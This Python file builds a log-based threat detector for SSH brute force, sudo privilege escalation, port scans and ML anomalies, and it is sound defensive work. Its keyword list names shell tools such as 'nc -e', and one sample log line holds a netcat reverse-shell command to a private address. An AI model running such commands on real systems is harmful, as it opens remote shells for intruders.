import pandas as pd
import numpy as np
import re
from datetime import datetime, timedelta
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
from pyod.models.knn import KNN
from pyod.models.lof import LOF
import sqlite3
import logging
import json

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ThreatDetector:
    def __init__(self, db_path="data/results.db"):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize database for threat detection results"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS threat_alerts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                detection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                alert_type TEXT NOT NULL,
                severity TEXT NOT NULL,
                source_ip TEXT,
                target_ip TEXT,
                description TEXT,
                raw_log TEXT,
                confidence_score REAL
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS log_analysis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                analysis_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                log_source TEXT,
                total_events INTEGER,
                suspicious_events INTEGER,
                anomaly_score REAL
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def parse_auth_logs(self, log_content):
        """Parse authentication logs and extract relevant information"""
        events = []
        
        # Common auth log patterns
        ssh_failed_pattern = r'(\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}).*sshd.*Failed password for (\w+) from ([\d\.]+)'
        ssh_success_pattern = r'(\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}).*sshd.*Accepted password for (\w+) from ([\d\.]+)'
        sudo_pattern = r'(\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}).*sudo.*(\w+).*COMMAND=(.*)'
        
        lines = log_content.split('\n')
        
        for line in lines:
            if not line.strip():
                continue
            
            # SSH failed attempts
            ssh_failed_match = re.search(ssh_failed_pattern, line)
            if ssh_failed_match:
                events.append({
                    'timestamp': ssh_failed_match.group(1),
                    'event_type': 'ssh_failed',
                    'username': ssh_failed_match.group(2),
                    'source_ip': ssh_failed_match.group(3),
                    'raw_log': line.strip()
                })
            
            # SSH successful attempts
            ssh_success_match = re.search(ssh_success_pattern, line)
            if ssh_success_match:
                events.append({
                    'timestamp': ssh_success_match.group(1),
                    'event_type': 'ssh_success',
                    'username': ssh_success_match.group(2),
                    'source_ip': ssh_success_match.group(3),
                    'raw_log': line.strip()
                })
            
            # Sudo commands
            sudo_match = re.search(sudo_pattern, line)
            if sudo_match:
                events.append({
                    'timestamp': sudo_match.group(1),
                    'event_type': 'sudo',
                    'username': sudo_match.group(2),
                    'command': sudo_match.group(3),
                    'raw_log': line.strip()
                })
        
        return events
    
    def parse_firewall_logs(self, log_content):
        """Parse firewall logs"""
        events = []
        
        # Common firewall log patterns
        blocked_pattern = r'(\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}).*BLOCK.*SRC=([\d\.]+).*DST=([\d\.]+).*DPT=(\d+)'
        
        lines = log_content.split('\n')
        
        for line in lines:
            if not line.strip():
                continue
            
            blocked_match = re.search(blocked_pattern, line)
            if blocked_match:
                events.append({
                    'timestamp': blocked_match.group(1),
                    'event_type': 'firewall_block',
                    'source_ip': blocked_match.group(2),
                    'dest_ip': blocked_match.group(3),
                    'dest_port': blocked_match.group(4),
                    'raw_log': line.strip()
                })
        
        return events
    
    def detect_brute_force(self, events, time_window=300, threshold=5):
        """Detect brute force attacks based on failed login attempts"""
        alerts = []
        
        # Group failed SSH attempts by source IP
        failed_attempts = {}
        
        for event in events:
            if event['event_type'] == 'ssh_failed':
                source_ip = event['source_ip']
                
                if source_ip not in failed_attempts:
                    failed_attempts[source_ip] = []
                
                failed_attempts[source_ip].append(event)
        
        # Check for brute force patterns
        for source_ip, attempts in failed_attempts.items():
            if len(attempts) >= threshold:
                alerts.append({
                    'alert_type': 'Brute Force Attack',
                    'severity': 'HIGH',
                    'source_ip': source_ip,
                    'description': f'Detected {len(attempts)} failed SSH attempts from {source_ip}',
                    'raw_log': attempts[-1]['raw_log'],
                    'confidence_score': min(0.95, 0.5 + (len(attempts) * 0.05))
                })
        
        return alerts
    
    def detect_privilege_escalation(self, events):
        """Detect potential privilege escalation attempts"""
        alerts = []
        
        suspicious_commands = [
            'su -', 'sudo su', 'passwd', 'chmod 777', 'chmod +s',
            '/bin/sh', '/bin/bash', 'nc -e', 'python -c', 'perl -e'
        ]
        
        for event in events:
            if event['event_type'] == 'sudo':
                command = event.get('command', '').lower()
                
                for sus_cmd in suspicious_commands:
                    if sus_cmd in command:
                        alerts.append({
                            'alert_type': 'Privilege Escalation',
                            'severity': 'MEDIUM',
                            'source_ip': 'localhost',
                            'description': f'Suspicious sudo command executed: {command}',
                            'raw_log': event['raw_log'],
                            'confidence_score': 0.7
                        })
                        break
        
        return alerts
    
    def detect_anomalous_traffic(self, events):
        """Detect anomalous network traffic patterns"""
        alerts = []
        
        # Count connections per IP
        ip_connections = {}
        
        for event in events:
            if event['event_type'] == 'firewall_block':
                source_ip = event['source_ip']
                dest_port = event['dest_port']
                
                if source_ip not in ip_connections:
                    ip_connections[source_ip] = {'total': 0, 'ports': set()}
                
                ip_connections[source_ip]['total'] += 1
                ip_connections[source_ip]['ports'].add(dest_port)
        
        # Detect port scanning (many ports from single IP)
        for source_ip, data in ip_connections.items():
            if len(data['ports']) > 20:  # Scanning multiple ports
                alerts.append({
                    'alert_type': 'Port Scan',
                    'severity': 'MEDIUM',
                    'source_ip': source_ip,
                    'description': f'Port scanning detected from {source_ip} - {len(data["ports"])} ports scanned',
                    'raw_log': f'Multiple port scan attempts from {source_ip}',
                    'confidence_score': 0.8
                })
            
            # Detect DDoS-like patterns (high volume from single IP)
            if data['total'] > 100:
                alerts.append({
                    'alert_type': 'High Volume Traffic',
                    'severity': 'HIGH',
                    'source_ip': source_ip,
                    'description': f'High volume traffic from {source_ip} - {data["total"]} blocked connections',
                    'raw_log': f'High volume blocked connections from {source_ip}',
                    'confidence_score': 0.85
                })
        
        return alerts
    
    def ml_anomaly_detection(self, events):
        """Use machine learning to detect anomalies in log patterns"""
        if len(events) < 10:
            return []
        
        # Create feature vectors from events
        features = []
        
        for event in events:
            feature_vector = [
                len(event.get('raw_log', '')),  # Log length
                1 if event['event_type'] == 'ssh_failed' else 0,
                1 if event['event_type'] == 'ssh_success' else 0,
                1 if event['event_type'] == 'sudo' else 0,
                1 if event['event_type'] == 'firewall_block' else 0,
            ]
            features.append(feature_vector)
        
        # Apply anomaly detection
        try:
            features_array = np.array(features)
            
            # Isolation Forest
            iso_forest = IsolationForest(contamination=0.1, random_state=42)
            anomalies = iso_forest.fit_predict(features_array)
            
            alerts = []
            for i, is_anomaly in enumerate(anomalies):
                if is_anomaly == -1:  # -1 indicates anomaly
                    alerts.append({
                        'alert_type': 'ML Anomaly',
                        'severity': 'MEDIUM',
                        'source_ip': events[i].get('source_ip', 'unknown'),
                        'description': 'Machine learning detected anomalous log pattern',
                        'raw_log': events[i]['raw_log'],
                        'confidence_score': 0.6
                    })
            
            return alerts
            
        except Exception as e:
            logger.error(f"ML anomaly detection failed: {e}")
            return []
    
    def analyze_logs(self, log_content, log_type='auth'):
        """Main function to analyze logs and detect threats"""
        logger.info(f"Starting log analysis for {log_type} logs")
        
        # Parse logs based on type
        if log_type == 'auth':
            events = self.parse_auth_logs(log_content)
        elif log_type == 'firewall':
            events = self.parse_firewall_logs(log_content)
        else:
            # Try to parse as both
            events = self.parse_auth_logs(log_content) + self.parse_firewall_logs(log_content)
        
        logger.info(f"Parsed {len(events)} events from logs")
        
        if not events:
            return [], []
        
        # Run threat detection algorithms
        all_alerts = []
        
        # Rule-based detection
        brute_force_alerts = self.detect_brute_force(events)
        privilege_escalation_alerts = self.detect_privilege_escalation(events)
        traffic_anomaly_alerts = self.detect_anomalous_traffic(events)
        
        # ML-based detection
        ml_alerts = self.ml_anomaly_detection(events)
        
        all_alerts.extend(brute_force_alerts)
        all_alerts.extend(privilege_escalation_alerts)
        all_alerts.extend(traffic_anomaly_alerts)
        all_alerts.extend(ml_alerts)
        
        # Store alerts in database
        self.store_alerts(all_alerts)
        
        # Store analysis summary
        self.store_analysis_summary(log_type, len(events), len(all_alerts))
        
        logger.info(f"Analysis complete: {len(all_alerts)} threats detected")
        
        return events, all_alerts
    
    def store_alerts(self, alerts):
        """Store threat alerts in database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        for alert in alerts:
            cursor.execute('''
                INSERT INTO threat_alerts 
                (alert_type, severity, source_ip, target_ip, description, raw_log, confidence_score)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                alert['alert_type'],
                alert['severity'],
                alert.get('source_ip'),
                alert.get('target_ip'),
                alert['description'],
                alert['raw_log'],
                alert['confidence_score']
            ))
        
        conn.commit()
        conn.close()
    
    def store_analysis_summary(self, log_source, total_events, suspicious_events):
        """Store analysis summary"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        anomaly_score = suspicious_events / total_events if total_events > 0 else 0
        
        cursor.execute('''
            INSERT INTO log_analysis 
            (log_source, total_events, suspicious_events, anomaly_score)
            VALUES (?, ?, ?, ?)
        ''', (log_source, total_events, suspicious_events, anomaly_score))
        
        conn.commit()
        conn.close()
    
    def get_recent_alerts(self, limit=50):
        """Get recent threat alerts"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT * FROM threat_alerts 
            ORDER BY detection_time DESC 
            LIMIT ?
        ''', (limit,))
        
        results = cursor.fetchall()
        conn.close()
        
        return results
    
    def generate_sample_logs(self):
        """Generate sample logs for testing"""
        sample_logs = """
Oct 15 10:23:45 server sshd[12345]: Failed password for root from 192.168.1.100 port 22 ssh2
Oct 15 10:23:47 server sshd[12346]: Failed password for root from 192.168.1.100 port 22 ssh2
Oct 15 10:23:49 server sshd[12347]: Failed password for admin from 192.168.1.100 port 22 ssh2
Oct 15 10:23:51 server sshd[12348]: Failed password for user from 192.168.1.100 port 22 ssh2
Oct 15 10:23:53 server sshd[12349]: Failed password for test from 192.168.1.100 port 22 ssh2
Oct 15 10:23:55 server sshd[12350]: Failed password for guest from 192.168.1.100 port 22 ssh2
Oct 15 10:24:01 server sshd[12351]: Accepted password for john from 192.168.1.50 port 22 ssh2
Oct 15 10:24:15 server sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/bin/su -
Oct 15 10:24:30 server sudo: john : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/nc -e /bin/sh 10.0.0.1 4444
Oct 15 10:25:00 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd SRC=10.0.0.10 DST=192.168.1.1 LEN=40 TOS=0x00 PREC=0x00 TTL=64 ID=12345 PROTO=TCP SPT=54321 DPT=22 WINDOW=1024 RES=0x00 SYN URGP=0
Oct 15 10:25:01 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd SRC=10.0.0.10 DST=192.168.1.1 LEN=40 TOS=0x00 PREC=0x00 TTL=64 ID=12346 PROTO=TCP SPT=54322 DPT=80 WINDOW=1024 RES=0x00 SYN URGP=0
Oct 15 10:25:02 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd SRC=10.0.0.10 DST=192.168.1.1 LEN=40 TOS=0x00 PREC=0x00 TTL=64 ID=12347 PROTO=TCP SPT=54323 DPT=443 WINDOW=1024 RES=0x00 SYN URGP=0
"""
        return sample_logs

# Example usage
if __name__ == "__main__":
    detector = ThreatDetector()
    
    # Generate sample logs for testing
    sample_logs = detector.generate_sample_logs()
    
    # Analyze logs
    events, alerts = detector.analyze_logs(sample_logs, 'auth')
    
    print(f"Detected {len(alerts)} threats:")
    for alert in alerts:
        print(f"- {alert['alert_type']}: {alert['description']} (Confidence: {alert['confidence_score']:.2f})")